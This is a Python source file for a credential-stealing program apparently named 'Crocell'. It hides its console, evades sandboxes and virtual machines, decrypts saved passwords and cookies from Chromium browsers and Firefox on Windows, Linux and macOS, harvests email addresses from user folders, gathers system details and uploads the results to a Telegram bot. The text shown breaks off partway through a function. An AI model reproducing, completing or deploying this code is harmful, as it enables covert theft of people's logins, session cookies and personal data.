#!/usr/bin/env python3
import os
import sys
import time
import platform
import socket
import uuid
import requests
import re
import json
import sqlite3
import shutil
import glob
import random
import ctypes
from datetime import datetime, timedelta
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from base64 import b64decode, b64encode
import subprocess

# Cross-platform imports
try:
    import psutil
    import getpass
except ImportError:
    psutil = None
    getpass = None

# Windows-specific imports
if sys.platform == "win32":
    try:
        import win32crypt
        from Crypto.Cipher import AES
        HAS_WIN32 = True
    except ImportError:
        HAS_WIN32 = False
else:
    HAS_WIN32 = False

# Linux/Mac imports
if sys.platform in ["linux", "darwin"]:
    try:
        from Crypto.Cipher import AES, DES3
        from Crypto.Protocol.KDF import PBKDF2
        import hmac
        import hashlib
        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False
else:
    HAS_CRYPTO = False

# Stealth mode - suppress all output
STEALTH_MODE = True
ENABLE_LOGGING = False

# Hide console window on Windows
if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# =============================================================================
# STEALTH & ANTI-DETECTION
# =============================================================================


def is_sandboxed():
    """Detect if running in VM/sandbox"""
    try:
        if psutil:
            # Check for common VM/sandbox indicators
            vm_indicators = ["vmware", "virtualbox", "vbox", "qemu", "xen", "sandbox"]
            hostname = socket.gethostname().lower()
            username = os.getenv("USERNAME") or os.getenv("USER") or ""
            username = username.lower()

            if any(ind in hostname for ind in vm_indicators):
                return True
            if any(ind in username for ind in vm_indicators):
                return True
            if psutil.cpu_count() < 2:
                return True
            if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
                return True
    except:
        pass
    return False


def add_random_delay():
    """Add random delay to avoid behavioral detection"""
    try:
        time.sleep(random.uniform(0.5, 2.0))
    except:
        pass


def silent_print(*args, **kwargs):
    """Print only if not in stealth mode"""
    if not STEALTH_MODE:
        try:
            print(*args, **kwargs)
        except:
            pass


# =============================================================================
# CONFIGURATION SECTION
# =============================================================================


class Config:
    """Configuration management - NO HARDCODED CREDENTIALS"""

    def __init__(self):
        try:
            # REQUIRE environment variables - no fallback to hardcoded values
            self.bot_token = os.getenv("CROCELL_BOT_TOKEN")
            self.chat_id = os.getenv("CROCELL_CHAT_ID")
            
            if not self.bot_token or not self.chat_id:
                raise ValueError("CROCELL_BOT_TOKEN and CROCELL_CHAT_ID must be set as environment variables")
            
            self.log_level = (
                "CRITICAL" if STEALTH_MODE else os.getenv("CROCELL_LOG_LEVEL", "INFO")
            )
            self.max_retries = int(os.getenv("CROCELL_MAX_RETRIES", "3"))
            self.retry_delay = int(os.getenv("CROCELL_RETRY_DELAY", "2"))
            self.extract_passwords = (
                os.getenv("CROCELL_EXTRACT_PASSWORDS", "true").lower() == "true"
            )
            self.extract_cookies = (
                os.getenv("CROCELL_EXTRACT_COOKIES", "true").lower() == "true"
            )
            self.telegram_timeout = int(os.getenv("CROCELL_TELEGRAM_TIMEOUT", "30"))
        except Exception as e:
            silent_print(f"Configuration error: {e}")
            raise

    def __str__(self):
        return ""


# =============================================================================
# LOGGING SYSTEM (DISABLED IN STEALTH MODE)
# =============================================================================


class Logger:
    """Silent logger for stealth mode"""

    def __init__(self, name="", level="CRITICAL"):
        class SilentLogger:
            def info(self, *args, **kwargs):
                pass

            def warning(self, *args, **kwargs):
                pass

            def error(self, *args, **kwargs):
                pass

            def debug(self, *args, **kwargs):
                pass

            def critical(self, *args, **kwargs):
                pass

        self.logger = SilentLogger()

    def get_logger(self):
        return self.logger


# =============================================================================
# TELEGRAM API COMMUNICATION
# =============================================================================


class TelegramAPI:
    """Handles communication with Telegram API"""

    def __init__(self, config):
        self.config = config
        self.logger = Logger().get_logger()
        self.base_url = f"https://api.telegram.org/bot{config.bot_token}"

    def send_message(self, message, parse_mode="Markdown"):
        """Send message to Telegram with retry logic"""
        try:
            add_random_delay()
            url = f"{self.base_url}/sendMessage"
            payload = {
                "chat_id": self.config.chat_id,
                "text": message,
                "parse_mode": parse_mode,
            }

            for attempt in range(self.config.max_retries):
                try:
                    response = requests.post(
                        url, json=payload, timeout=self.config.telegram_timeout
                    )
                    response.raise_for_status()
                    return True
                except:
                    if attempt < self.config.max_retries - 1:
                        time.sleep(self.config.retry_delay)
                    continue
            return False
        except:
            return False

    def send_document(self, file_path, caption=None):
        """Send document file to Telegram with retry logic"""
        try:
            add_random_delay()
            url = f"{self.base_url}/sendDocument"

            for attempt in range(self.config.max_retries):
                try:
                    with open(file_path, "rb") as file:
                        files = {"document": file}
                        data = {"chat_id": self.config.chat_id}
                        if caption:
                            data["caption"] = caption

                        response = requests.post(
                            url,
                            data=data,
                            files=files,
                            timeout=self.config.telegram_timeout,
                        )
                        response.raise_for_status()
                        return True
                except:
                    if attempt < self.config.max_retries - 1:
                        time.sleep(self.config.retry_delay)
                    continue
            return False
        except:
            return False


# =============================================================================
# CROSS-PLATFORM PATH MANAGER
# =============================================================================


class PathManager:
    """Manages browser paths across different operating systems"""

    def __init__(self):
        self.os_type = platform.system()
        self.home = Path.home()

    def get_chromium_paths(self):
        """Get paths for Chromium-based browsers"""
        paths = {}

        if self.os_type == "Windows":
            paths = {
                "Chrome": {
                    "root": self.home / "AppData/Local/Google/Chrome/User Data",
                    "local_state": self.home / "AppData/Local/Google/Chrome/User Data/Local State",
                },
                "Edge": {
                    "root": self.home / "AppData/Local/Microsoft/Edge/User Data",
                    "local_state": self.home / "AppData/Local/Microsoft/Edge/User Data/Local State",
                },
                "Brave": {
                    "root": self.home / "AppData/Local/BraveSoftware/Brave-Browser/User Data",
                    "local_state": self.home / "AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State",
                },
                "Opera": {
                    "root": self.home / "AppData/Roaming/Opera Software/Opera Stable",
                    "local_state": self.home / "AppData/Roaming/Opera Software/Opera Stable/Local State",
                },
                "Vivaldi": {
                    "root": self.home / "AppData/Local/Vivaldi/User Data",
                    "local_state": self.home / "AppData/Local/Vivaldi/User Data/Local State",
                },
            }
        elif self.os_type == "Linux":
            paths = {
                "Chrome": {
                    "root": self.home / ".config/google-chrome",
                    "local_state": self.home / ".config/google-chrome/Local State",
                },
                "Chromium": {
                    "root": self.home / ".config/chromium",
                    "local_state": self.home / ".config/chromium/Local State",
                },
                "Brave": {
                    "root": self.home / ".config/BraveSoftware/Brave-Browser",
                    "local_state": self.home / ".config/BraveSoftware/Brave-Browser/Local State",
                },
                "Opera": {
                    "root": self.home / ".config/opera",
                    "local_state": self.home / ".config/opera/Local State",
                },
                "Vivaldi": {
                    "root": self.home / ".config/vivaldi",
                    "local_state": self.home / ".config/vivaldi/Local State",
                },
            }
        elif self.os_type == "Darwin":  # macOS
            paths = {
                "Chrome": {
                    "root": self.home / "Library/Application Support/Google/Chrome",
                    "local_state": self.home / "Library/Application Support/Google/Chrome/Local State",
                },
                "Edge": {
                    "root": self.home / "Library/Application Support/Microsoft Edge",
                    "local_state": self.home / "Library/Application Support/Microsoft Edge/Local State",
                },
                "Brave": {
                    "root": self.home / "Library/Application Support/BraveSoftware/Brave-Browser",
                    "local_state": self.home / "Library/Application Support/BraveSoftware/Brave-Browser/Local State",
                },
                "Opera": {
                    "root": self.home / "Library/Application Support/com.operasoftware.Opera",
                    "local_state": self.home / "Library/Application Support/com.operasoftware.Opera/Local State",
                },
                "Vivaldi": {
                    "root": self.home / "Library/Application Support/Vivaldi",
                    "local_state": self.home / "Library/Application Support/Vivaldi/Local State",
                },
            }

        return paths

    def get_firefox_paths(self):
        """Get paths for Firefox"""
        paths = {}

        if self.os_type == "Windows":
            firefox_base = self.home / "AppData/Roaming/Mozilla/Firefox/Profiles"
        elif self.os_type == "Linux":
            firefox_base = self.home / ".mozilla/firefox"
        elif self.os_type == "Darwin":
            firefox_base = self.home / "Library/Application Support/Firefox/Profiles"
        else:
            return paths

        if firefox_base.exists():
            # Find all profile directories
            for profile_dir in firefox_base.glob("*.default*"):
                if profile_dir.is_dir():
                    paths[profile_dir.name] = {
                        "root": profile_dir,
                        "logins": profile_dir / "logins.json",
                        "key4": profile_dir / "key4.db",
                        "cookies": profile_dir / "cookies.sqlite",
                    }

        return paths


# =============================================================================
# FIREFOX PASSWORD & COOKIE EXTRACTOR
# =============================================================================


class FirefoxExtractor:
    """Extract passwords and cookies from Firefox using Python-only implementation"""

    def __init__(self, log_level="CRITICAL"):
        self.logger = Logger().get_logger()
        self.passwords = []
        self.cookies = []
        self.path_manager = PathManager()

    def extract_passwords(self):
        """Extract Firefox passwords"""
        try:
            add_random_delay()
            firefox_paths = self.path_manager.get_firefox_paths()

            if not firefox_paths:
                return []

            for profile_name, paths in firefox_paths.items():
                try:
                    if paths["logins"].exists():
                        self._extract_from_profile(profile_name, paths)
                except Exception as e:
                    continue

            return self.passwords
        except:
            return []

    def extract_cookies(self):
        """Extract Firefox cookies"""
        try:
            add_random_delay()
            firefox_paths = self.path_manager.get_firefox_paths()

            if not firefox_paths:
                return []

            for profile_name, paths in firefox_paths.items():
                try:
                    if paths["cookies"].exists():
                        self._extract_cookies_from_profile(profile_name, paths)
                except Exception as e:
                    continue

            return self.cookies
        except:
            return []

    def _extract_from_profile(self, profile_name, paths):
        """Extract passwords from a Firefox profile"""
        try:
            with open(paths["logins"], "r", encoding="utf-8") as f:
                logins_data = json.load(f)

            # Try to get master key from key4.db
            master_password = None
            try:
                master_password = self._get_master_key(paths["key4"])
            except:
                pass

            for login in logins_data.get("logins", []):
                try:
                    hostname = login.get("hostname", "")
                    username = login.get("encryptedUsername", "")
                    password = login.get("encryptedPassword", "")

                    # Try to decrypt (will fail without master password support)
                    decrypted_username = self._decrypt_firefox_value(username, master_password)
                    decrypted_password = self._decrypt_firefox_value(password, master_password)

                    if hostname and decrypted_username:
                        entry = {
                            "browser": "Firefox",
                            "profile": f"[{profile_name}]",
                            "url": hostname,
                            "username": decrypted_username,
                            "password": decrypted_password if decrypted_password else "[ENCRYPTED]",
                            "source": f"Firefox[{profile_name}]",
                        }
                        self.passwords.append(entry)
                except:
                    continue
        except Exception as e:
            pass

    def _extract_cookies_from_profile(self, profile_name, paths):
        """Extract cookies from Firefox profile"""
        try:
            # Create temp copy of cookies database
            temp_db = Path(os.getenv("TEMP", "/tmp")) / f"firefox_cookies_{profile_name}.sqlite"
            shutil.copy2(paths["cookies"], temp_db)

            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()

            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
                FROM moz_cookies
            """)

            for row in cursor.fetchall():
                try:
                    host, name, value, path, expiry, is_secure, is_httponly, samesite = row

                    # Convert expiry timestamp
                    if expiry and expiry > 0:
                        expiry_date = datetime.fromtimestamp(expiry)
                        expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
                        is_session = False
                    else:
                        expiry_str = "Session"
                        is_session = True

                    cookie_entry = {
                        "browser": "Firefox",
                        "profile": f"[{profile_name}]",
                        "host": host,
                        "name": name,
                        "value": value,
                        "path": path,
                        "expires": expiry_str,
                        "is_secure": bool(is_secure),
                        "is_httponly": bool(is_httponly),
                        "is_session": is_session,
                        "samesite": str(samesite),
                        "source": f"Firefox[{profile_name}]",
                    }
                    self.cookies.append(cookie_entry)
                except:
                    continue

            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
        except Exception as e:
            pass

    def _get_master_key(self, key4_path):
        """Attempt to extract master key from key4.db (simplified)"""
        # This is a simplified version - full NSS decryption is complex
        # For production use, you'd need proper NSS library integration
        return None

    def _decrypt_firefox_value(self, encrypted_value, master_key=None):
        """Attempt to decrypt Firefox encrypted value"""
        try:
            if not encrypted_value:
                return ""

            # Firefox uses 3DES encryption with PKCS#7 padding
            # This is a simplified implementation
            # For full support, you'd need NSS library

            # For now, return base64 decoded value or encrypted marker
            try:
                decoded = b64decode(encrypted_value)
                # Try to extract plaintext (simplified)
                return decoded.decode("utf-8", errors="ignore")
            except:
                return "[ENCRYPTED]"
        except:
            return "[ENCRYPTED]"


# =============================================================================
# CHROMIUM PASSWORD EXTRACTOR (CROSS-PLATFORM)
# =============================================================================


class ChromiumPasswordExtractor:
    """Extract passwords from Chromium-based browsers (cross-platform)"""

    def __init__(self, log_level="CRITICAL"):
        self.logger = Logger().get_logger()
        self.passwords = []
        self.encrypted_passwords = []
        self.path_manager = PathManager()
        self.os_type = platform.system()

    def extract_passwords(self):
        """Extract passwords from all detected Chromium browsers"""
        try:
            add_random_delay()
            browser_paths = self.path_manager.get_chromium_paths()

            for browser_name, paths in browser_paths.items():
                try:
                    if paths["root"].exists() and paths["local_state"].exists():
                        self._process_browser(browser_name, paths["root"], paths["local_state"])
                except:
                    continue

            return self.passwords + self.encrypted_passwords
        except:
            return []

    def _find_profiles(self, browser_root: Path):
        """Find all profiles"""
        profiles = []

        default_login = browser_root / "Default" / "Login Data"
        if default_login.exists():
            profiles.append(("Default", default_login))

        for profile_dir in browser_root.glob("Profile *"):
            login_db = profile_dir / "Login Data"
            if login_db.exists():
                profiles.append((profile_dir.name, login_db))

        return profiles

    def _load_aes_key(self, local_state_path: Path):
        """Load and decrypt AES key (cross-platform)"""
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        enc_key_b64 = local_state["os_crypt"]["encrypted_key"]
        enc_key = b64decode(enc_key_b64)

        if enc_key.startswith(b"DPAPI"):
            enc_key = enc_key[5:]

        if self.os_type == "Windows" and HAS_WIN32:
            return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
        elif self.os_type in ["Linux", "Darwin"]:
            # On Linux/Mac, Chrome uses a hardcoded password
            return self._linux_decrypt_key(enc_key)
        else:
            raise NotImplementedError(f"Unsupported OS: {self.os_type}")

    def _linux_decrypt_key(self, encrypted_key):
        """Decrypt key on Linux/macOS"""
        try:
            # Chrome on Linux uses 'peanuts' as password with PBKDF2
            salt = b'saltysalt'
            iv = b' ' * 16
            length = 16
            iterations = 1

            if self.os_type == "Darwin":  # macOS
                # Try to get password from keychain
                try:
                    password = self._get_mac_keychain_password()
                    if not password:
                        password = b'peanuts'
                except:
                    password = b'peanuts'
            else:  # Linux
                password = b'peanuts'

            key = PBKDF2(password, salt, dkLen=length, count=iterations)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted_key)

            # Remove PKCS7 padding
            padding_length = decrypted[-1]
            return decrypted[:-padding_length]
        except:
            return encrypted_key

    def _get_mac_keychain_password(self):
        """Get Chrome password from macOS Keychain"""
        try:
            cmd = [
                'security',
                'find-generic-password',
                '-w',
                '-s',
                'Chrome Safe Storage',
                '-a',
                'Chrome'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                return result.stdout.strip().encode()
        except:
            pass
        return None

    def _decrypt_password(self, encrypted_value, aes_key: bytes) -> str:
        """Decrypt password (cross-platform)"""
        try:
            if not encrypted_value or len(encrypted_value) == 0:
                return "[NO_PASSWORD]"

            if isinstance(encrypted_value, memoryview):
                encrypted_value = encrypted_value.tobytes()

            # Check for v10/v11/v20 (AES-GCM)
            if encrypted_value.startswith(b"v10") or encrypted_value.startswith(b"v11") or encrypted_value.startswith(b"v20"):
                if len(encrypted_value) < 3 + 12 + 16:
                    return "[ENCRYPTED]"

                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]

                try:
                    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                    return plaintext.decode("utf-8", errors="replace")
                except:
                    return "[ENCRYPTED]"

            # Legacy DPAPI (Windows only)
            if self.os_type == "Windows" and HAS_WIN32:
                try:
                    plaintext = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                    return plaintext.decode("utf-8", errors="replace")
                except:
                    return "[ENCRYPTED]"

            # Linux/Mac v10 format
            if HAS_CRYPTO:
                try:
                    cipher = AES.new(aes_key, AES.MODE_CBC, encrypted_value[:16])
                    plaintext = cipher.decrypt(encrypted_value[16:])
                    # Remove padding
                    padding_length = plaintext[-1]
                    plaintext = plaintext[:-padding_length]
                    return plaintext.decode("utf-8", errors="replace")
                except:
                    return "[ENCRYPTED]"

            return "[ENCRYPTED]"
        except:
            return "[ENCRYPTED]"

    def _process_browser(self, browser_name: str, browser_root: Path, local_state_path: Path):
        """Process browser profiles"""
        try:
            profiles = self._find_profiles(browser_root)
            if not profiles:
                return

            master_key = self._load_aes_key(local_state_path)

            for profile_name, login_db in profiles:
                temp_db = Path(os.getenv("TEMP", "/tmp")) / f"{browser_name}_{profile_name}_Login.db"
                
                try:
                    shutil.copy2(login_db, temp_db)
                except:
                    continue

                conn = sqlite3.connect(str(temp_db))
                try:
                    cursor = conn.cursor()
                    cursor.execute("""
                        SELECT
                            COALESCE(origin_url, action_url, signon_realm, '') AS url,
                            username_value,
                            password_value
                        FROM logins
                    """)
                    rows = cursor.fetchall()
                finally:
                    conn.close()

                try:
                    os.remove(temp_db)
                except:
                    pass

                for url, username, encrypted_password in rows:
                    try:
                        site = url or "[NO_URL]"
                        user = username or "[NO_USERNAME]"
                        decrypted = self._decrypt_password(encrypted_password, master_key)

                        if site.startswith("android://") or not user or user == "[NO_USERNAME]":
                            continue
                        if not decrypted or decrypted == "[NO_PASSWORD]":
                            continue

                        profile_tag = f"[{profile_name}]" if profile_name != "Default" else ""
                        entry = {
                            "browser": browser_name,
                            "profile": profile_tag,
                            "url": site,
                            "username": user,
                            "password": decrypted,
                            "source": f"{browser_name}{profile_tag}",
                        }

                        if decrypted == "[ENCRYPTED]":
                            self.encrypted_passwords.append(entry)
                        else:
                            self.passwords.append(entry)
                    except:
                        continue
        except Exception as e:
            pass


# =============================================================================
# CHROMIUM COOKIE EXTRACTOR (CROSS-PLATFORM)
# =============================================================================


class ChromiumCookieExtractor:
    """Extract cookies from Chromium-based browsers (cross-platform)"""

    def __init__(self, log_level="CRITICAL"):
        self.logger = Logger().get_logger()
        self.cookies = []
        self.path_manager = PathManager()
        self.os_type = platform.system()

    def extract_cookies(self):
        """Extract cookies from all detected Chromium browsers"""
        try:
            add_random_delay()
            browser_paths = self.path_manager.get_chromium_paths()

            for browser_name, paths in browser_paths.items():
                try:
                    if paths["root"].exists() and paths["local_state"].exists():
                        self._process_browser(browser_name, paths["root"], paths["local_state"])
                except:
                    continue

            return self.cookies
        except:
            return []

    def _find_profiles(self, browser_root: Path):
        """Find all profiles"""
        profiles = []

        # Try both "Cookies" and "Network/Cookies" locations
        default_cookies = browser_root / "Default" / "Network" / "Cookies"
        if not default_cookies.exists():
            default_cookies = browser_root / "Default" / "Cookies"
        
        if default_cookies.exists():
            profiles.append(("Default", default_cookies))

        for profile_dir in browser_root.glob("Profile *"):
            cookies_db = profile_dir / "Network" / "Cookies"
            if not cookies_db.exists():
                cookies_db = profile_dir / "Cookies"
            
            if cookies_db.exists():
                profiles.append((profile_dir.name, cookies_db))

        return profiles

    def _load_aes_key(self, local_state_path: Path):
        """Load and decrypt AES key (same as password extractor)"""
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        enc_key_b64 = local_state["os_crypt"]["encrypted_key"]
        enc_key = b64decode(enc_key_b64)

        if enc_key.startswith(b"DPAPI"):
            enc_key = enc_key[5:]

        if self.os_type == "Windows" and HAS_WIN32:
            return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
        elif self.os_type in ["Linux", "Darwin"]:
            return self._linux_decrypt_key(enc_key)
        else:
            raise NotImplementedError(f"Unsupported OS: {self.os_type}")

    def _linux_decrypt_key(self, encrypted_key):
        """Decrypt key on Linux/macOS"""
        try:
            salt = b'saltysalt'
            iv = b' ' * 16
            length = 16
            iterations = 1

            if self.os_type == "Darwin":
                try:
                    password = self._get_mac_keychain_password()
                    if not password:
                        password = b'peanuts'
                except:
                    password = b'peanuts'
            else:
                password = b'peanuts'

            key = PBKDF2(password, salt, dkLen=length, count=iterations)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted_key)

            padding_length = decrypted[-1]
            return decrypted[:-padding_length]
        except:
            return encrypted_key

    def _get_mac_keychain_password(self):
        """Get Chrome password from macOS Keychain"""
        try:
            cmd = [
                'security',
                'find-generic-password',
                '-w',
                '-s',
                'Chrome Safe Storage',
                '-a',
                'Chrome'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                return result.stdout.strip().encode()
        except:
            pass
        return None

    def _decrypt_cookie(self, encrypted_value, aes_key: bytes) -> str:
        """Decrypt cookie value (cross-platform)"""
        try:
            if not encrypted_value or len(encrypted_value) == 0:
                return ""

            if isinstance(encrypted_value, memoryview):
                encrypted_value = encrypted_value.tobytes()

            # Check for v10/v11/v20
            if encrypted_value.startswith(b"v10") or encrypted_value.startswith(b"v11") or encrypted_value.startswith(b"v20"):
                if len(encrypted_value) < 3 + 12 + 16:
                    return "[ENCRYPTED]"

                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]

                try:
                    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                    return plaintext.decode("utf-8", errors="replace")
                except:
                    return "[ENCRYPTED]"

            # Legacy DPAPI (Windows)
            if self.os_type == "Windows" and HAS_WIN32:
                try:
                    plaintext = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                    return plaintext.decode("utf-8", errors="replace")
                except:
                    return "[ENCRYPTED]"

            # Linux/Mac CBC mode
            if HAS_CRYPTO:
                try:
                    cipher = AES.new(aes_key, AES.MODE_CBC, encrypted_value[:16])
                    plaintext = cipher.decrypt(encrypted_value[16:])
                    padding_length = plaintext[-1]
                    plaintext = plaintext[:-padding_length]
                    return plaintext.decode("utf-8", errors="replace")
                except:
                    return "[ENCRYPTED]"

            return "[ENCRYPTED]"
        except:
            return "[ENCRYPTED]"

    def _process_browser(self, browser_name: str, browser_root: Path, local_state_path: Path):
        """Process browser profiles for cookies"""
        try:
            profiles = self._find_profiles(browser_root)
            if not profiles:
                return

            master_key = self._load_aes_key(local_state_path)

            for profile_name, cookies_db in profiles:
                temp_db = Path(os.getenv("TEMP", "/tmp")) / f"{browser_name}_{profile_name}_Cookies.db"
                
                try:
                    shutil.copy2(cookies_db, temp_db)
                except:
                    continue

                conn = sqlite3.connect(str(temp_db))
                try:
                    cursor = conn.cursor()
                    cursor.execute("""
                        SELECT
                            host_key,
                            name,
                            value,
                            encrypted_value,
                            path,
                            expires_utc,
                            is_secure,
                            is_httponly,
                            has_expires,
                            is_persistent,
                            samesite
                        FROM cookies
                    """)
                    rows = cursor.fetchall()
                finally:
                    conn.close()

                try:
                    os.remove(temp_db)
                except:
                    pass

                for row in rows:
                    try:
                        host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, has_expires, is_persistent, samesite = row

                        # Decrypt cookie value
                        if encrypted_value and len(encrypted_value) > 0:
                            decrypted_value = self._decrypt_cookie(encrypted_value, master_key)
                        else:
                            decrypted_value = value or ""

                        if decrypted_value == "[ENCRYPTED]":
                            continue

                        # Determine if session cookie
                        is_session = not is_persistent or expires_utc == 0

                        # Convert expiry timestamp
                        if expires_utc and expires_utc > 0:
                            try:
                                expiry_date = datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)
                                expiry_str = expiry_date.strftime("%Y-%m-%d %H:%M:%S")
                            except:
                                expiry_str = "Unknown"
                        else:
                            expiry_str = "Session"

                        profile_tag = f"[{profile_name}]" if profile_name != "Default" else ""

                        cookie_entry = {
                            "browser": browser_name,
                            "profile": profile_tag,
                            "host": host_key,
                            "name": name,
                            "value": decrypted_value,
                            "path": path,
                            "expires": expiry_str,
                            "is_secure": bool(is_secure),
                            "is_httponly": bool(is_httponly),
                            "is_session": is_session,
                            "samesite": samesite if samesite else "None",
                            "source": f"{browser_name}{profile_tag}",
                        }

                        self.cookies.append(cookie_entry)
                    except:
                        continue
        except Exception as e:
            pass


# =============================================================================
# EMAIL EXTRACTOR (CROSS-PLATFORM)
# =============================================================================


class EmailExtractor:
    """Extract email addresses from the system (cross-platform)"""

    def __init__(self, log_level="CRITICAL"):
        self.logger = Logger().get_logger()
        try:
            self.email_pattern = re.compile(
                r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b"
            )
            self.emails = set()
            self.emails_lock = Lock()
            self.max_workers = min(16, (os.cpu_count() or 1) * 2)
            self.max_depth = 2
            self.max_file_size = 3 * 1024 * 1024
            self.files_scanned = 0
            self.max_files = 3000
        except:
            self.emails = set()

        # Cross-platform scan directories
        home = Path.home()
        self.scan_dirs = [
            home / "Documents",
            home / "Downloads",
            home / "Desktop",
        ]

        # Add platform-specific directories
        if platform.system() == "Windows":
            self.scan_dirs.extend([
                home / "AppData/Local/Microsoft/Outlook",
                home / "AppData/Roaming/Thunderbird",
                home / "AppData/Roaming/Microsoft/Outlook",
            ])
        elif platform.system() == "Linux":
            self.scan_dirs.extend([
                home / ".thunderbird",
                home / ".config/google-chrome",
            ])
        elif platform.system() == "Darwin":
            self.scan_dirs.extend([
                home / "Library/Mail",
                home / "Library/Application Support/Thunderbird",
            ])

        self.scan_extensions = {
            ".txt", ".csv", ".json", ".xml", ".html", ".htm",
            ".log", ".ini", ".conf", ".cfg", ".yaml", ".yml",
            ".eml", ".msg", ".vcf", ".ics",
        }

        self.skip_dirs = {
            "node_modules", ".git", "__pycache__", "venv",
            "Cache", "cache", "temp", "tmp",
        }

        self.skip_patterns = {
            ".exe", ".dll", ".sys", ".bin", ".jpg", ".png",
            ".mp3", ".mp4", ".zip", ".rar", ".pdf",
        }

    def extract_emails(self):
        """Extract all unique email addresses"""
        try:
            add_random_delay()

            files_to_scan = []
            for directory in self.scan_dirs:
                try:
                    if directory.exists():
                        files_to_scan.extend(
                            self._collect_files_limited(directory, depth=0)
                        )
                except:
                    continue

            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {
                    executor.submit(self._scan_file, file_path): file_path
                    for file_path in files_to_scan[: self.max_files]
                }

                for future in as_completed(futures):
                    try:
                        future.result()
                    except:
                        pass

            return list(self.emails)
        except:
            return []

    def _collect_files_limited(self, directory, depth=0):
        """Collect files with depth limit"""
        files = []

        if depth > self.max_depth or len(files) >= self.max_files:
            return files

        try:
            items = list(directory.iterdir())

            for item in items:
                if len(files) >= self.max_files:
                    break
                try:
                    if item.is_file():
                        if (
                            item.suffix.lower() in self.scan_extensions
                            and item.suffix.lower() not in self.skip_patterns
                        ):
                            files.append(item)
                except (PermissionError, OSError):
                    continue

            for item in items:
                if len(files) >= self.max_files:
                    break
                try:
                    if item.is_dir() and not item.name.startswith("."):
                        if item.name not in self.skip_dirs:
                            files.extend(self._collect_files_limited(item, depth + 1))
                except (PermissionError, OSError):
                    continue

        except (PermissionError, OSError):
            pass

        return files

    def _scan_file(self, file_path):
        """Scan file for email addresses"""
        try:
            file_size = file_path.stat().st_size
            if file_size == 0 or file_size > self.max_file_size:
                return

            if file_path.suffix.lower() in self.skip_patterns:
                return

            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read(self.max_file_size)
                found_emails = set(self.email_pattern.findall(content))

            if found_emails:
                valid_emails = {
                    email.lower()
                    for email in found_emails
                    if not any(
                        x in email.lower()
                        for x in ["example.", "test.", "localhost.", "xxx"]
                    )
                }

                if valid_emails:
                    with self.emails_lock:
                        self.emails.update(valid_emails)
                        self.files_scanned += 1

        except (PermissionError, OSError):
            pass
        except Exception:
            pass


# =============================================================================
# SYSTEM INFORMATION COLLECTOR (CROSS-PLATFORM)
# =============================================================================


class SystemInfoCollector:
    """Collect comprehensive system information (cross-platform)"""

    def __init__(self, log_level="CRITICAL", extract_passwords=True, extract_cookies=True):
        self.logger = Logger().get_logger()
        self.info = {}
        self.os_type = platform.system()
        
        try:
            self.email_extractor = EmailExtractor()
            
            # Chromium extractors (all platforms)
            self.chromium_password_extractor = ChromiumPasswordExtractor() if extract_passwords else None
            self.chromium_cookie_extractor = ChromiumCookieExtractor() if extract_cookies else None
            
            # Firefox extractors (all platforms)
            self.firefox_extractor = FirefoxExtractor() if (extract_passwords or extract_cookies) else None
            
        except Exception as e:
            self.email_extractor = None
            self.chromium_password_extractor = None
            self.chromium_cookie_extractor = None
            self.firefox_extractor = None

    def collect_all(self):
        """Collect all system information"""
        try:
            add_random_delay()
            self._collect_basic_info()
            
            if psutil:
                self._collect_cpu_info()
                self._collect_memory_info()
                self._collect_disk_info()
                self._collect_boot_time()
            
            self._collect_network_info()
            
            if self.email_extractor:
                self._collect_emails()
            
            if self.chromium_password_extractor or self.firefox_extractor:
                self._collect_passwords()
            
            if self.chromium_cookie_extractor or self.firefox_extractor:
                self._collect_cookies()
            
            return self.info
        except:
            return self.info

    def _collect_basic_info(self):
        """Collect basic system information"""
        try:
            if getpass:
                system_user = getpass.getuser()
            else:
                system_user = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"

            self.info["system"] = {
                "os": f"{platform.system()} {platform.release()}",
                "version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "hostname": socket.gethostname(),
                "username": platform.node(),
                "system_user": system_user,
                "platform": self.os_type,
            }
        except Exception as e:
            self.info["system"] = {"error": str(e)}

    def _collect_cpu_info(self):
        """Collect CPU information"""
        try:
            cpu_freq = psutil.cpu_freq()
            self.info["cpu"] = {
                "physical_cores": psutil.cpu_count(logical=False),
                "total_cores": psutil.cpu_count(logical=True),
                "current_usage": f"{psutil.cpu_percent()}%",
